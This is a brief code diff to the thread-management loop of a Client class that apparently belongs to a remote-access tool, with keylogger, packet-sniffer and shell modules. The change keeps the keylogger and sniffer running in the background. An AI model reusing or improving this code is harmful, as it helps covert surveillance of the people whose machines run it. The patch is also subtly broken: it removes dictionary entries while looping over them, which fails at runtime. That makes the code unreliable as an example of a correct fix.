@@ -537,12 +537,12 @@ class Client(object):
                 self._threads[name] = Thread(target=module, name=name)
                 self._threads[name].daemon = True
         for worker, task in self._threads.items():
-            if not worker.is_alive():
+            if not task.is_alive():
                 task.start()
         for worker, task in self._threads.items():
             if worker not in ('keylogger','packetsniff'):
                 task.join()
-                self._threads.remove(worker)
+                _ = self._threads.pop(worker, None)
         return self._show(self._result)
 
     def _shell(self):
